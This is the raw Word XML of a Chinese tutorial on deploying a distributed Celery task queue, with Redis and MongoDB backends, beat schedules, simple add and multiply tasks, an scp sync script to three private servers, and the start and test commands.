    </w:p>
    <w:p w14:paraId="7FF9E950" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="360" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>init</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31789BD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Celery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFEA7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166F758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app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Celery</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"demo"</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CFCFF6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app</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config_from_object</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"celery_app.celeryconfig"</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DE1AAF" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="3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celeryconfig.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B27B6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schedules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crontab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7133D68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datetime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timedelta</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB921C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kombu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Queue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1550AB9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kombu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Exchange</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D304BC"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0469947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result_serializer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'json'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617054F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2D7978F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broker_url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"redis://192.168.1.2"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2822ED7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result_backend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"mongodb://192.168.1.2/celery"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFC64C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timezone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"Asia/Shanghai"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B377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imports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66FEDBE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'celery_app.task1'</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A46174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'celery_app.task2'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF82F7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45421AA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1404A55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beat_schedule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114821C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'add-every-20-seconds'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174465A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'task'</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'celery_app.task1.multiply'</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FB638C"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="669900"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'schedule'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timedelta</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seconds</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20</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0826C31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'args'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5</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7</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5216D2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09911F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'add-every-10-seconds'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1B5406C8"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'task'</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'celery_app.task2.add'</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0194E16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'schedule'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crontab</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hour</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9</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minute</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10</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4797EF7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'schedule'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timedelta</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seconds</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10</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACB0AF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'args'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23</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54</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A707D6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887797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604B81A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4BBAB3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task_queues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487CD3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Queue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'default'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exchange</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Exchange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'default'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routing_key</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="9A6E3A"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="669900"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'default'</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D7B2E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Queue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exchange</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Exchange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routing_key</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="9A6E3A"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>=</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p>
    <w:p w14:paraId="05F6590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Queue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exchange</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Exchange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routing_key</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="9A6E3A"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>=</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p>
    <w:p w14:paraId="56C21B9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6FAA271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6DAB252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task_routes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9BE1E9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'celery_app.task1.multiply'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'queue'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'routing_key'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p>
    <w:p w14:paraId="6DA9633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'celery_app.task2.add'</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'queue'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'routing_key'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p>
    <w:p w14:paraId="164F602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7E28ED6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03290AA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xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="708090"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>每分钟最大速率</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58894D3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task_annotations = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26639CC3"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'task2.multiply': {'rate_limit': '10/m'}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5681994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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E28B6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420B520D" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="3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task1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47578FD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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6470D9C6" w14:textId="1D03E635"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app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="585F7A2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@app</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task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DE730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def</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD4A68"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>multiply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x</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y</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF092B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"multiply"</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013A2E6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time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sleep</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4</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30132C2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return</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> x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y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A912B2E" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="3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lastRenderedPageBreak/>
        <w:t>task2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3281B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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA82C3D" w14:textId="204548BB"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app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B62D4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@app</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task</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F2CB4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def</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="DD4A68"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>add</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x</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y</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176DA3F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add</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6437D22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time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sleep</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2</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C87294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return</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> x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y</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78480260" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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上传项目</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D901ECC" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="3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写个同步文件</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sync.sh</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，方便将项目文件分别上传到三台服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CFA771E" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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scp</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r celery_app root@192.168.1.2:~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB868E1" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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scp</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r celery_app root@192.168.1.3:~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709C554E" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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scp</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r celery_app root@192.168.1.4:~</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38817BCF" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="708090"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>开始上传</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A779262" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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chmod</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> +x sync.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38379FCE" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D9259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./sync.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FA7262" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="3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其实不是每台服务器都需要所有的文件，只是为了方便就全部上传上去了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B02FD8E" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00D92594">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="36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启动</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC61643"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#worker 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6650F4D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celery -A celery_app -l info -n worker1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACD902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#worker 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2117C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celery -A celery_app -l info -n worker2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9998F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#broker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528EF32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/var/mongodb/bin/mongod -f /var/mongodb/conf/mongod.conf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5112354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nohup</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> redis-server </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="9A6E3A"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>amp</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42936533" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00544204"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nohup</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> celery -A celery_app flower -l info </w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="9A6E3A"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>amp</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9E1F09" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="00544204"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celery -A celery_app beat -l info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C195703"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全部启动完成之后可以看到</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已经开始自动分配定时任务了</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="232BF784"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noProof/>
          <w:color w:val="3498DB"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A710B39" wp14:editId="3DC870F5">
            <wp:extent cx="9347333" cy="4368942"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="57" name="图片 57">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348188" cy="4369342"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C34C4E" w14:textId="77777777" w:rsidR="00E00B91" w:rsidRPr="007E4FA0" w:rsidRDefault="00E00B91" w:rsidP="00E00B91">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="96"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="25"/>
          <w:szCs w:val="25"/>
        </w:rPr>
        <w:t>提交自定义任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275345DF"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test.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40AC475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task1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C38B6F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task2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CFA84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task1</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multiply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delay</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2</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8</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3776718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re2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task2</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add</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delay</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5</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6</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EDE61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"ok"</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A0D3F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re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get</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF0EC93"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lastRenderedPageBreak/>
        <w:t>print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re2</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get</w:t>
      </w:r>
      <w:r w:rsidRPr="007E4FA0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="宋体" w:hAnsi="Consolas" w:cs="宋体"/>
          <w:color w:val="999999"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB07335"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输出：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B408DBF"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/usr/bin/python3.4 /media/chengyu/Project/Github/CMSpider/test.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068ABBE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ok</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1356FC1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16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B10AA5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11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196270E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Process finished with exit code 0</w:t>
      </w:r>
    </w:p>
